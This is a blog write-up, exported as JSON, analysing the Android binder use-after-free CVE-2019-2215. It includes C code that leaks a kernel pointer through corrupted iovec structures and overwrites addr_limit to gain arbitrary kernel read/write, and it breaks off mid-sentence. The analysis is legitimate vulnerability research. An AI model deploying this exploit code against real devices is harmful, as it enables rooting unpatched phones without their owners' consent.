{"hash":"01524ce74c8fee6fa4cbb63332b7a77c073a07ed","data":{"tag":{"title":"Exploit Analysis","slug":"exploit-analysis","path":"/tag/exploit-analysis/","belongsTo":{"edges":[{"node":{"title":"Analyzing Android's CVE-2019-2215 (/dev/binder UAF)","path":"/posts/analyzing-androids-cve-2019-2215-dev-binder-uaf/","date":"8 November 2019","description":"Over the past few weeks, those of you who frequent the DAY[0] streams over on\nour Twitch may have seen me working on trying to understand the recent Android\nBinder Use-After-Free (UAF) published by Google's Project Zero (p0). This bug is\nactually not new, the issue was discovered and fixed in the mainline kernel in\nFebruary 2018, however, p0 discovered many popular devices did not receive the\npatch downstream. Some of these devices include the Pixel 2, the Huawei P20, and\nSamsung Galaxy S7, S8, ","content":"<p>Over the past few weeks, those of you who frequent the DAY[0] streams over on our Twitch may have seen me working on trying to understand the recent Android Binder Use-After-Free (UAF) published by Google's Project Zero (p0). This bug is actually not new, the issue was discovered and fixed in the mainline kernel in February 2018, however, p0 discovered many popular devices did not receive the patch downstream. Some of these devices include the Pixel 2, the Huawei P20, and Samsung Galaxy S7, S8, and S9 phones. I believe many of these devices received security patches within the last couple weeks that finally killed the bug.</p><p>After a few streams of poking around with a kernel debugger on a virtual machine (running Android-x86), and testing with a vulnerable Pixel 2, I've came to understand the exploit written by Jann Horn and Maddie Stone pretty well. Without an understanding of Binder (the <code>binder_thread</code> object specifically), as well as how Vectored I/O works, the exploit can be pretty confusing. It's also quite clever how they exploited this issue, so I thought it would be cool to write up how the exploit works.</p><p>We'll mostly be focusing on how an arbitrary read/write primitive is established, we won't focus on the post-exploit stuff such as disabling SELinux and enabling full root capabilities as there are quite a few write-ups out there already that cover that. Here's a brief overview of what this article will cover:</p><ol><li>Basic overview of Binder and Vectored I/O</li><li>Vulnerability details</li><li>Leaking the kernel task struct</li><li>Establishing an arbitrary read/write (arbitrary r/w) primitive</li><li>Conclusion</li></ol><p>Note that all code snippets will be from kernel v4.4.177, as this is the kernel I tested on personally.</p><h2 id=\"basic-overview-of-binder-and-vectored-i-o\">Basic overview of Binder and Vectored I/O</h2><h4 id=\"binder\">Binder</h4><p>The Binder driver is an Android-only driver which provides an easy method of Inter Process Communication (IPC), including Remote Procedure Calling (RPC). You will find this driver's source code in the mainline Linux kernel, however it is not configured for non-Android builds.</p><p>There are a few different binder device drivers that are used for different types of IPC. For communication between framework and app processes using the Android Interface Definition Language (AIDL), <code>/dev/binder</code> is used. For communication between framework and vendor processes / hardware using the Hardware Abstraction Layer (HAL) Interface Definition Language (HIDL), <code>/dev/hwbinder</code> is used. Finally, for vendors who want to use IPC between vendor processes without using HIDL, <code>/dev/vndbinder</code> is used. For the purposes of the exploit, we only care about the first driver, <code>/dev/binder</code>.</p><p>Like most IPC mechanisms in Linux, binder works through file descriptors, and you can add event polls to it using the EPOLL API.</p><h3 id=\"vectored-i-o\">Vectored I/O</h3><p>Vectored I/O allows you to either write into a data stream using multiple buffers, or read from a data stream into multiple buffers. It's also known as \"scatter/gather I/O\". Vectored I/O offers a few advantages over non-vectored I/O. For one, you can write with or read to different buffers that are non-contiguous without a bunch of overhead. It's also atomic.</p><p>An example of where vectored I/O is useful is a data packet where you have a header followed by data in a contiguous block. Using vectored I/O, you can keep the header and the data in separate, non-contiguous buffers, and read to them or write using them with one system call instead of two.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://i.imgur.com/IFDZCdA.png\" class=\"kg-image\" alt=\"vectored IO diagram\"></figure><p>How this works is you'll define an array of <code>iovec</code> structures which contain information about all the buffers you'd like to use for I/O. The <code>iovec</code> structure is relatively small, consisting only of two QWORDS (8 byte data) on 64-bit systems.</p><pre><code class=\"language-c\">struct iovec { \t\t// Size: 0x10\n    void *iov_base;\t// 0x00\n    size_t iov_len; // 0x08\n}\n</code></pre><h2 id=\"vulnerability-details\">Vulnerability details</h2><p>The Binder driver has a cleanup routine you can trigger from <code>ioctl()</code> before actually closing the driver. If you're familiar with drivers and cleanup routines, you can likely already guess why this is can cause issues.</p><p>Let's look at the p0 report summary.</p><!--kg-card-begin: markdown--><blockquote>\n<p>As described in the upstream commit:</p>\n<p>â€œbinder_poll() passes the thread-&gt;wait waitqueue that<br>\ncan be slept on for work. When a thread that uses<br>\nepoll explicitly exits using BINDER_THREAD_EXIT,<br>\nthe waitqueue is freed, but it is never removed<br>\nfrom the corresponding epoll data structure. When<br>\nthe process subsequently exits, the epoll cleanup<br>\ncode tries to access the waitlist, which results in<br>\na use-after-free.</p>\n</blockquote>\n<!--kg-card-end: markdown--><p>This summary is a bit misleading. The use-after-free is not on the waitqueue itself. The waitqueue is an inline struct in the <code>binder_thread</code> structure, the <code>binder_thread</code> object is what's actually UAF'd. The reason they mention the waitqueue directly in this commit summary is this issue was originally found by Google's Syzkaller fuzzer back in 2017, and the fuzzer triggered a use-after-free detected by the Kernel Address Sanitizer (KASAN) on the waitqueue's mutex.</p><h3 id=\"the-free\">The free</h3><p>Let's take a look at the ioctl command in question, <code>BINDER_THREAD_EXIT</code>.</p><pre><code class=\"language-c\">static long binder_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)\n{\n\t// [...]\n    \n    switch (cmd) {\n\t// [...]\n\tcase BINDER_THREAD_EXIT:\n\t\tbinder_debug(BINDER_DEBUG_THREADS, \"%d:%d exit\\n\",\n\t\t\t     proc-&gt;pid, thread-&gt;pid);\n\t\tbinder_free_thread(proc, thread);\n\t\tthread = NULL;\n\t\tbreak;\n     // [...]\n    }\n}\n\n// [...]\n\nstatic int binder_free_thread(struct binder_proc *proc,\n\t\t\t      struct binder_thread *thread)\n{\n\tstruct binder_transaction *t;\n\tstruct binder_transaction *send_reply = NULL;\n\tint active_transactions = 0;\n\n\t// [...]\n    \n\twhile (t) {\n\t\tactive_transactions++;\n\t\t// [...]\n\t}\n\tif (send_reply)\n\t\tbinder_send_failed_reply(send_reply, BR_DEAD_REPLY);\n\tbinder_release_work(&amp;thread-&gt;todo);\n\tkfree(thread);\n\tbinder_stats_deleted(BINDER_STAT_THREAD);\n\treturn active_transactions;\n}\n</code></pre><p>The critical line of code here is line 2610, <code>kfree(thread)</code>. This is where the \"free\" part of the use-after-free happens.</p><h3 id=\"the-use-after-free-\">The use (after free)</h3><p>Now that we've seen where the free happens, let's try to see where the use happens. The stack trace from the KASAN report will be helpful for this.</p><pre><code class=\"language-text\">Call Trace:\n  ...\n  _raw_spin_lock_irqsave+0x96/0xc0 kernel/locking/spinlock.c:159\n  remove_wait_queue+0x81/0x350 kernel/sched/wait.c:50\n  ep_remove_wait_queue fs/eventpoll.c:595 [inline]\n  ep_unregister_pollwait.isra.7+0x18c/0x590 fs/eventpoll.c:613\n  ep_free+0x13f/0x320 fs/eventpoll.c:830\n  ep_eventpoll_release+0x44/0x60 fs/eventpoll.c:862\n  ...\n</code></pre><p>At first, it can be a bit confusing because the <code>binder_thread</code> object is referenced indirectly, ie. if you ctrl + f for <code>binder_thread</code> you won't find any occurrences. However, if we quickly look at <code>ep_unregister_pollwait()</code>:</p><pre><code class=\"language-c\">static void ep_unregister_pollwait(struct eventpoll *ep, struct epitem *epi)\n{\n\tstruct list_head *lsthead = &amp;epi-&gt;pwqlist;\n\tstruct eppoll_entry *pwq;\n\n\twhile (!list_empty(lsthead)) {\n\t\tpwq = list_first_entry(lsthead, struct eppoll_entry, llink);\n\n\t\tlist_del(&amp;pwq-&gt;llink);\n\t\tep_remove_wait_queue(pwq);\n\t\tkmem_cache_free(pwq_cache, pwq);\n\t}\n}\n</code></pre><p>We'll notice our free'd <code>binder_thread</code> is in <code>epoll_entry</code>'s linked list, and eventually will be what <code>pwq</code> is.</p><pre><code class=\"language-c\">static void ep_remove_wait_queue(struct eppoll_entry *pwq)\n{\n\twait_queue_head_t *whead;\n\n\trcu_read_lock();\n\t/*\n\t * If it is cleared by POLLFREE, it should be rcu-safe.\n\t * If we read NULL we need a barrier paired with\n\t * smp_store_release() in ep_poll_callback(), otherwise\n\t * we rely on whead-&gt;lock.\n\t */\n\twhead = smp_load_acquire(&amp;pwq-&gt;whead);\n\tif (whead)\n\t\tremove_wait_queue(whead, &amp;pwq-&gt;wait);\n\trcu_read_unlock();\n}\n</code></pre><p>We can see that <code>pwq</code> is used in two places. One is the head of the linked list for the wait queues, <code>whead</code>. The other is the wait queue object itself being deleted via <code>remove_wait_queue</code>.</p><p>At first glance it seems both arguments to <code>remove_wait_queue</code> should be relatively close in memory, but the <code>smp_load_acquire()</code> macro needs to be considered. This macro is a memory barrier. Initially I assumed this macro just added some compiler stuff for atomic access to <code>whead</code>, but this was a mistake. What's not entirely obvious is <code>smp_load_acquire()</code> macro dereferences what's passed to it. So what I originally read as <code>whead = &amp;pwq-&gt;whead</code> is actually more like <code>whead = *(wait_queue_head_t *)&amp;pwq-&gt;whead</code>, or more simply, <code>whead = pwq-&gt;whead</code>.</p><p>Let's look at <code>remove_wait_queue()</code>.</p><pre><code class=\"language-c\">// WRITE-UP COMMENT: q points into stale data / the UAF object\nvoid remove_wait_queue(wait_queue_head_t *q, wait_queue_t *wait)\n{\n\tunsigned long flags;\n\n\tspin_lock_irqsave(&amp;q-&gt;lock, flags);\n\t__remove_wait_queue(q, wait);\n\tspin_unlock_irqrestore(&amp;q-&gt;lock, flags);\n}\n</code></pre><p>When the head of the linked list ends up being our UAF'd <code>binder_thread</code>, <code>q</code> points to stale data. This is why a KASAN crash occurs on the spinlock - it will attempt to lock the mutex on <code>q</code>, which is free'd memory.</p><p>On normal devices not using KASAN instrumentation, if you run the Proof-of-Concept (PoC) as-is you likely won't notice anything. It's highly likely that no crash will occur, which may lead you to (incorrectly) assume the device is not vulnerable. This is because it is very likely <code>q</code> still points to valid, stale heap data. However, if you perform a heap spray of <code>0x41</code>'s, you will trigger a CPU stall, which will cause your device to freeze.</p><p>This is because a lock is essentially just an integer that's set to either 0 (for unlocked) or 1 (for locked). Technically, if the mutex is set to any value that's not zero, it's considered locked. Because an attacker-controlled heap spray will essentially lock the mutex without going through proper channels, this mutex will be permanently locked, which will cause a deadlock and freeze the device.</p><p>It's worth noting this object resides in the <code>kmalloc-512</code> cache, which is a pretty decent cache for exploitation because it's not used a lot by background processes compared to smaller caches. On kernel v4.4.177, the object is <code>0x190</code> or 400 bytes in size. Because of this size being so far from both <code>kmalloc-256</code> and <code>kmalloc-512</code> - it's a fair assumption that this object ends up in the <code>kmalloc-512</code> cache on most if not all devices.</p><h2 id=\"leaking-the-kernel-task-struct\">Leaking the kernel task struct</h2><h3 id=\"weaponizing-an-unlink\">Weaponizing an unlink</h3><p>The way this vulnerability was exploited was quite clever. The exploit takes advantage of a linked list unlink operation. This can be used on an overlapped object to corrupt it using the linked list meta-data.</p><p>Assuming the spinlock doesn't deadlock on an invalid mutex due to memory corruption, eventually the next <code>ep_remove_wait_queue()</code>'s <code>&amp;pwq-&gt;wait</code> reference will point into our UAF'd object. Consider what <code>remove_wait_queue()</code>, and inevitably, <code>__remove_wait_queue()</code>, does on this structure:</p><pre><code class=\"language-c\">// WRITEUP COMMENT: old points to stale data / the UAF object\nstatic inline void\n__remove_wait_queue(wait_queue_head_t *head, wait_queue_t *old)\n{\n\tlist_del(&amp;old-&gt;task_list);\n}\n// ...\nstatic inline void list_del(struct list_head *entry)\n{\n\t__list_del(entry-&gt;prev, entry-&gt;next);\n\tentry-&gt;next = LIST_POISON1;\n\tentry-&gt;prev = LIST_POISON2;\n}\n// ...\nstatic inline void __list_del(struct list_head * prev, struct list_head * next)\n{\n\tnext-&gt;prev = prev;\n\tWRITE_ONCE(prev-&gt;next, next);\n}\n</code></pre><p>The main line of importance here is <code>next-&gt;prev = prev</code>, This essentially is an unlink, and writes into our UAF'd object a pointer of the previous object.</p><p>This is useful because if we overlap another kernel object on top of our UAF'd object, we can weaponize this unlink to corrupt data in the overlapped object. This is used by p0 to leak kernel data. Which object is a good candidate for this attack strategy? Enter <code>iovec</code>.</p><p>There are a few properties of the<code>iovec</code> structure that makes it a really good candidate for exploitation here.</p><ol><li>They're small (0x10 in size on 64-bit machines) and you can control all the fields with very few restrictions</li><li>You can stack them and thus control which kmalloc cache your <code>iovec</code> stack ends up in by how many you write with</li><li>They have a pointer (<code>iov_base</code>) which will be a perfect field to corrupt with the unlink.</li></ol><p>Under normal circumstances, <code>iov_base</code> is checked in the kernel anywhere it's used. The kernel will first ensure that <code>iov_base</code> is a userland pointer before processing the request, however using the unlink primitive we just talked about, we can corrupt this pointer post-validation and overwrite it with a kernel pointer, being the <code>prev</code> object in the unlink process.</p><p>This means when we read from a descriptor that was written to with the corrupted <code>iovec</code>, we'll be reading data originating from a kernel pointer, <em>not</em> a userland one like it's intended. This will allow us to leak kernel data relative to the <code>prev</code> pointer, which contains pointers useful enough to allow for arbitrary read/write as well as code execution.</p><p>The tricky step of this process is figuring out which <code>iovec</code>'s index lines up with the waitqueue. This is important because if we don't fake the mutex properly, the device will hang and we won't be able to have any fun on it.</p><p>Finding the offset of the waitqueue is fairly easy if you have a kernel image of the version you're targeting. By looking at a function that uses the waitqueue field of <code>binder_thread</code>, we can easily find the offset in the disassembly. One such function is <code>binder_wakeup_thread_ilocked()</code>. It calls <code>wake_up_interruptible_sync(&amp;thread-&gt;wait)</code>. The offset should be referenced when the address is loaded into the X0 register just before the call.</p><pre><code class=\"language-assembly\">.text:0000000000C0E2B4    ADD    X0, X8, #0xA0\n.text:0000000000C0E2B8    MOV    W1, #1\n.text:0000000000C0E2BC    MOV    W2, #1\n.text:0000000000C0E2C0    TBZ    W19, #0, loc_C0E2CC\n.text:0000000000C0E2C4    BL     __wake_up_sync\n</code></pre><p>On kernel v4.4.177, we can see the wait queue is <code>0xA0</code> bytes into the <code>binder_thread</code> object. Since <code>iovec</code> is 0x10 in size, this means the <code>iovec</code> at index <code>0xA</code> in the array will line up with the wait queue.</p><pre><code class=\"language-c\">#define BINDER_THREAD_SZ 0x190\n#define IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 16)\n#define WAITQUEUE_OFFSET 0xA0\n#define IOVEC_INDX_FOR_WQ (WAITQUEUE_OFFSET / 16)\n</code></pre><p>So how does one pass a valid <code>iov_base</code> address which will pass validation while also keeping the lock at 0 to prevent a deadlock? Since the lock is only a DWORD (4 bytes), and a 64-bit pointer can be passed, you just need to use <code>mmap()</code> to map a userland address where the lower 32-bits are 0.</p><pre><code class=\"language-c\">dummy_page = mmap((void *)0x100000000ul, 2 * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n\n// ...\n\nstruct iovec iovec_array[IOVEC_ARRAY_SZ];\nmemset(iovec_array, 0, sizeof(iovec_array));\n\niovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page_4g_aligned; /* spinlock in the low address half must be zero */\niovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0x1000; /* wq-&gt;task_list-&gt;next */\niovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (void *)0xDEADBEEF; /* wq-&gt;task_list-&gt;prev */\niovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = 0x1000;\n</code></pre><p>When the exploit runs, the <code>iovec</code> at <code>IOVEC_INDX_FOR_WQ</code> will take the place of the mutex, as well as the <code>next</code> pointer in the linked list. The <code>iovec</code> at <code>IOVEC_INDX_FOR_WQ + 1</code> will take the place of the <code>prev</code> pointer in the linked list. This means <code>IOVEC_INDX_FOR_WQ + 1</code>'s <code>iov_base</code> field is the one that will be overwritten with a kernel pointer.</p><p>Let's take a look at the free'd memory in KGDB on a VM running Android-x86 before and after the unlink operation. To do this, I set a breakpoint on the call to <code>remove_wait_queue()</code>. The first argument will point to the free'd memory, so we'll find the pointer in the RDI register. If we examine this memory before the call, we'll see the following:</p><pre><code class=\"language-text\">Thread 1 hit Breakpoint 11, 0xffffffff812811c2 in ep_unregister_pollwait.isra ()\ngdb-peda$ x/50wx $rdi\n0xffff8880959d68a0:     0x00000000      0x00000001      0x00001000      0x00000000\n0xffff8880959d68b0:     0xdeadbeef      0x00000000      0x00001000      0x00000000\n...\n</code></pre><p>Notice the data overlaps with some <code>iovec</code> structures from above - for example we can see 0xdeadbeef at <code>0xffff88809239a6b0</code>. Now let's take a look at the same memory after the the unlink occurs. We'll set a breakpoint at the end of <code>ep_unregister_pollwait</code> and examine the same memory.</p><pre><code class=\"language-text\">Thread 1 hit Breakpoint 12, 0xffffffff812811ee in ep_unregister_pollwait.isra ()\ngdb-peda$ x/50wx 0xffff8880959d68a0\n0xffff8880959d68a0:     0x00000000      0x00000001      0x959d68a8      0xffff8880\n0xffff8880959d68b0:     0x959d68a8      0xffff8880      0x00001000      0x00000000\n...\n</code></pre><p>The <code>iov_len</code> of the <code>iovec</code> at <code>IOVEC_INDX_FOR_WQ</code> was overwritten with a kernel pointer, and the <code>iov_base</code> of the <code>iovec</code> at <code>IOVEC_INDX_FOR_WQ + 1</code> was overwritten with the same kernel pointer - thus corrupting the <code>iovec</code>'s internal backing structure in the kernel heap!</p><h3 id=\"triggering-the-leak\">Triggering the leak</h3><p>It seems p0 decided to go with a pipe as the medium for the leak. The attack strategy is basically as follows:</p><ol><li>Create a pipe</li><li>Trigger the free() on the <code>binder_thread</code> object so that the <code>iovec</code> structures allocated in the next step overlap it</li><li>Write the <code>iovec</code> structures into <code>binder_thread</code>'s old memory via the <code>writev()</code> system call on the pipe</li><li>Trigger the use-after-free / unlink to corrupt the <code>iovec</code> structure</li><li>Call <code>read()</code> on the pipe, which will use the uncorrupted <code>iovec</code> at <code>IOVEC_INDX_FOR_WQ</code> to read the <code>dummy_page</code> data.</li><li>Call <code>read()</code> on the pipe again, which will use the corrupted <code>iovec</code> at <code>IOVEC_INDX_FOR_WQ + 1</code> to read kernel data into the leak buffer.</li></ol><p>Because we initialized two <code>iovec</code>'s with an <code>iov_len</code> of 0x1000, ultimately the <code>writev()</code> call will write two pages of data. The first page will contain data from <code>dummy_page</code>, which isn't useful for exploitation. The second page will contain kernel data!</p><p>It's easier to handle the reads and writes in two separate threads. The parent thread is responsible for:</p><ol><li>Triggering the free() on <code>binder_thread</code></li><li>Writing the <code>iovec</code> stack to the pipe connected to the child process, which will overlap the free'd <code>binder_thread</code></li><li>(waits on the child thread)</li><li>Reading the second page of leaked kernel data</li></ol><p>The child thread is responsible for:</p><ol><li>Corrupting the <code>iovec</code> by triggering the unlink via deletion of the EPOLL event</li><li>Reading the first page of dummy data</li></ol><p>When we put this all together, here's our leak code: (note that functionally this is similar to p0's except I cleaned it up a bit and ported it to an app, hence <code>__android_log_print()</code>)</p><pre><code class=\"language-c\">struct epoll_event event = {.events = EPOLLIN};\nstruct iovec iovec_array[IOVEC_ARRAY_SZ];\nchar leakBuff[0x1000];\nint pipefd[2];\nint byteSent;\npid_t pid;\n\nmemset(iovec_array, 0, sizeof(iovec_array));\n\nif(epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &amp;event))\n    exitWithError(\"EPOLL_CTL_ADD failed: %s\", strerror(errno));\n\niovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page; // mutex\niovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0x1000; // linked list next\niovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (void *)0xDEADBEEF; // linked list prev\niovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = 0x1000;\n\nif(pipe(pipefd))\n    exitWithError(\"Pipe failed: %s\", strerror(errno));\n\nif(fcntl(pipefd[0], F_SETPIPE_SZ, 0x1000) != 0x1000)\n    exitWithError(\"F_SETPIPE_SZ failed: %s\", strerror(errno));\n\npid = fork();\n\nif(pid == 0)\n{\n    prctl(PR_SET_PDEATHSIG, SIGKILL);\n    sleep(2);\n\n    epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &amp;event);\n\n    if(read(pipefd[0], leakBuff, sizeof(leakBuff)) != sizeof(leakBuff))\n        exitWithError(\"[CHILD] Read failed: %s\", strerror(errno));\n\n    close(pipefd[1]);\n    _exit(0);\n}\n\nioctl(fd, BINDER_THREAD_EXIT, NULL);\nbyteSent = writev(pipefd[1], iovec_array, IOVEC_ARRAY_SZ);\n\nif(byteSent != 0x2000)\n    exitWithError(\"[PARENT] Leak failed: writev returned %d, expected 0x2000.\", byteSent);\n\nif(read(pipefd[0], leakBuff, sizeof(leakBuff)) != sizeof(leakBuff))\n    exitWithError(\"[PARENT] Read failed: %s\", strerror(errno));\n\n__android_log_print(ANDROID_LOG_INFO, \"EXPLOIT\", \"leak + 0xE8 = %lx\\n\", *(uint64_t *)(leakBuff + 0xE8));\nthread_info = *(unsigned long *)(leakBuff + 0xE8);\n</code></pre><p>When we run this app, we'll get something similar to the following in logcat:</p><pre><code class=\"language-text\">com.example.binderuaf I/EXPLOIT: leak + 0xE8 = fffffffec88c5700\n</code></pre><p>This pointer points to the current process <code>thread_info</code> struct. This structure has a very useful field we can leverage to get an arbitrary read/write primitive.</p><h2 id=\"establishing-an-arbitrary-read-write-arbitrary-r-w-primitive\">Establishing an arbitrary read/write (arbitrary r/w) primitive</h2><h3 id=\"breaking-the-limits\">Breaking the limits</h3><p>So we've leaked a useful kernel pointer, now what? Let's take a look at the first few members of <code>task_info</code>, the object we're leaking the address of.</p><pre><code class=\"language-c\">struct thread_info {\n\tunsigned long\t\tflags;\t\t/* low level flags */\n\tmm_segment_t\t\taddr_limit;\t/* address limit */\n\tstruct task_struct\t*task;\t\t/* main task structure */\n\tint\t\t\tpreempt_count;\t    /* 0 =&gt; preemptable, &lt;0 =&gt; bug */\n\tint\t\t\tcpu;\t\t\t   /* cpu */\n};\n</code></pre><p>The field of interest here is <code>addr_limit</code>. There are some very important macros that reference this field in terms of security. Let's look at one of them - <code>access_ok</code>.</p><pre><code class=\"language-c\">#define access_ok(type, addr, size)\t__range_ok(addr, size)\n</code></pre><p>From the comment of <code>__range_ok()</code> - it's essentially equivalent to <code>(u65)addr + (u65)size &lt;= current-&gt;addr_limit</code>. This macro is used pretty much <em>everywhere</em> the kernel tries to access a user-provided pointer. It's used to ensure the pointer provided is <em>really</em> a userland pointer - and prevents people from trying to be clever by passing kernel pointers where the kernel expects userland pointers. See where I'm going with this? :)</p><p>Once this <code>addr_limit</code> is smashed, you can freely pass kernel pointers into where userland pointers are expected, and <code>access_ok()</code> will <em>never</em> fail.</p><h3 id=\"getting-a-controlled-write-primitive\">Getting a controlled write primitive</h3><p>We've already demonstrated we can use the unlink to read and leak kernel data - but what about modify it? Turns out we can do that too! To leak kernel data, we wrote non-contiguously into a file descriptor with a stack of <code>iovec</code> structures, and corrupted one of them with the unlink so that a <code>read()</code> call later on would leak data.</p><p>To corrupt kernel data, we go the other way. By calling <code>recvmsg()</code> with a stack of <code>iovec</code> structures and corrupting it the same way, we can force the data we wrote using <code>write()</code> to be copied over the sequential <code>iovec</code> structures to get an arbitrary write.</p><p>Let's look at the <code>iovec</code> stack we slot into our UAF'd object with <code>recvmsg()</code>.</p><pre><code class=\"language-c\">iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page; // mutex\niovec_array[IOVEC_INDX_FOR_WQ].iov_len = 1; // linked list next\niovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (void *)0xDEADBEEF; // linked list prev\niovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = 0x8 + 2 * 0x10; // iov_len of previous, then this element and next element\niovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base = (void *)0xBEEFDEAD;\niovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len = 8;\n</code></pre><p>Similar to the infoleak case, the unlink corrupts the <code>IOVEC_INDX_FOR_WQ</code>'s <code>iovec.iov_len</code> and <code>IOVEC_INDEX_FOR_WQ + 1</code>'s <code>iovec.iov_base</code> with kernel pointers pointing directly to <code>IOVEC_INDX_FOR_WQ</code>'s <code>iovec.iov_len</code>, however, this time it's splitting data we've written using these <code>iovec</code> structures.</p><p>Just like the infoleak case, the unlink corrupts the <code>iov_len</code> of the <code>iovec</code> at <code>IOVEC_INDX_FOR_WQ</code>, and the <code>iov_base</code> of the <code>iovec</code> at <code>IOVEC_INDX_FOR_WQ + 1</code> with a kernel pointer. This kernel pointer isn't just pointing into some random data somewhere - if we take a look at the KGDB output again, we'll notice it points to <code>iov_len</code> of the <code>iovec</code> at <code>IOVEC_INDX_FOR_WQ</code>!</p><figure class=\"kg-card kg-image-card\"><img src=\"https://i.imgur.com/xW4LRCS.png\" class=\"kg-image\" alt=\"gdb\"></figure><p>Once <code>recvmsg()</code> reaches this <code>iovec</code>, it will start copying the data we wrote with <code>write()</code> into this pointer - which allows us to write arbitrary data into the following <code>iovec</code> structs <em>post-validation</em>. This allows us to pass any pointer we want into the <code>iov_base</code> of the next <code>iovec</code> - giving us an arbitrary write. We control what gets written to this address with the tailing QWORD of the <code>write()</code>.</p><p>If we look at the data that gets written, we can indeed see that it aligns with the backing data of <code>iov_len</code> at <code>IOVEC_INDX_FOR_WQ</code> onwards.</p><pre><code class=\"language-c\">unsigned long second_write_chunk[] = {\n    1, /* iov_len */\n    0xdeadbeef, /* iov_base (already used) */\n    0x8 + 2 * 0x10, /* iov_len (already used) */\n    current_ptr + 0x8, /* next iov_base (addr_limit) */\n    8, /* next iov_len (sizeof(addr_limit)) */\n    0xfffffffffffffffe /* value to write */\n};\n</code></pre><p>The attack strategy is as follows:</p><ol><li>Create a socketpair</li><li>Trigger the free() on the <code>binder_thread</code> object so that <code>recvmsg()</code>'s <code>iovec</code> stack overlaps <code>binder_thread</code></li><li>Preemptively write 1 byte to satisfy the first <code>iovec</code></li><li>Write the <code>iovec</code> structures into <code>binder_thread</code>'s old memory via <code>recvmsg()</code></li><li>Trigger the use-after-free / unlink to corrupt the <code>iovec</code> structure</li><li>Call <code>write()</code> on the socketpair, which will use the corrupted <code>iovec</code> to corrupt the next <code>iovec</code> to do a controlled memory corruption.</li></ol><p>Again just like the leak, two threads are needed. The parent thread is responsible for:</p><ol><li>Preemptively writing 1 byte of data to satisfy <code>recvmsg()</code>'s first <code>iovec</code> request.</li><li>Triggering the free() on <code>binder_thread</code></li><li>Writing the <code>iovec</code> stack to the socket and waiting on data that matches the <code>iovec</code> requests via <code>recvmsg()</code></li></ol><p>The child thread is responsible for:</p><ol><li>Corrupting the <code>iovec</code> by triggering the unlink via deletion of the EPOLL event</li><li>Writing the data that will corrupt the proceeding <code>iovec</code> structures when the parent thread's <code>recvmsg()</code> call continues.</li></ol><p>Putting this all together, we end up with the following code to smash the parent process <code>addr_limit</code>. Again, functionally this code is the same as p0's however it's cleaned up and uses JNI functions.</p><pre><code class=\"language-c\">#define OFFSET_OF_ADDR_LIMIT 8\n\nstruct epoll_event event = {.events = EPOLLIN};\nstruct iovec iovec_array[IOVEC_ARRAY_SZ];\nint iovec_corruption_payload_sz;\nint sockfd[2];\nint byteSent;\npid_t pid;\n\nmemset(iovec_array, 0, sizeof(iovec_array));\n\nif(epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &amp;event))\n    exitWithError(\"EPOLL_CTL_ADD failed: %s\", strerror(errno));\n\nunsigned long iovec_corruption_payload[] = {\n        1,                  // IOVEC_INDX_FOR_WQ -&gt; iov_len\n        0xdeadbeef,         // IOVEC_INDX_FOR_WQ + 1 -&gt; iov_base\n        0x8 + (2 * 0x10),   // IOVEC_INDX_FOR_WQ + 1 -&gt; iov_len\n        thread_info + OFFSET_OF_ADDR_LIMIT, // Arb. Write location! IOVEC_INDEX_FOR_WQ + 2 -&gt; iov_base\n        8,                  // Arb. Write size (only need a QWORD)! IOVEC_INDEX_FOR_WQ + 2 -&gt; iov_len\n        0xfffffffffffffffe, // Arb. Write value! Smash it so we can write anywhere.\n};\n\niovec_corruption_payload_sz = sizeof(iovec_corruption_payload);\n\niovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page; // mutex\niovec_array[IOVEC_INDX_FOR_WQ].iov_len  = 1; // only ask for one byte since we'll only write one byte - linked list next\niovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (void *)0xDEADBEEF; // linked list prev\niovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len  = 0x8 + 2 * 0x10;     // length of previous iovec + this one + the next one\niovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base = (void *)0xBEEFDEAD; // will get smashed by iovec_corruption_payload\niovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len  = 8;\n\nif(socketpair(AF_UNIX, SOCK_STREAM, 0, sockfd))\n    exitWithError(\"Socket pair failed: %s\", strerror(errno));\n\n// Preemptively satisfy the first iovec request\nif(write(sockfd[1], \"X\", 1) != 1)\n    exitWithError(\"Write 1 byte failed: %s\", strerror(errno));\n\npid = fork();\n\nif(pid == 0)\n{\n    prctl(PR_SET_PDEATHSIG, SIGKILL);\n    sleep(2);\n\n    epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &amp;event);\n\n    byteSent = write(sockfd[1], iovec_corruption_payload, iovec_corruption_payload_sz);\n\n    if(byteSent != iovec_corruption_payload_sz)\n        exitWithError(\"[CHILD] Write returned %d, expected %d.\", byteSent, iovec_corruption_payload_sz);\n\n    _exit(0);\n}\n\nioctl(fd, BINDER_THREAD_EXIT, NULL);\n\nstruct msghdr msg = {\n        .msg_iov = iovec_array,\n        .msg_iovlen = IOVEC_ARRAY_SZ\n};\n\nrecvmsg(sockfd[0], &amp;msg, MSG_WAITALL);\n</code></pre><h3 id=\"arbitrary-read-write-helper-functions\">Arbitrary Read/Write Helper Functions</h3><p>Now that the process address limit has been smashed, arbitrary kernel read/write is as simple as a few <code>read()</code> and <code>write()</code> syscalls. By simply writing the data we want to write to a pipe with <code>write()</code>, and calling <code>read()</code> on the other end of the pipe with a kernel address, we can pipe data to an arbitrary kernel address.</p><p>Conversely, by 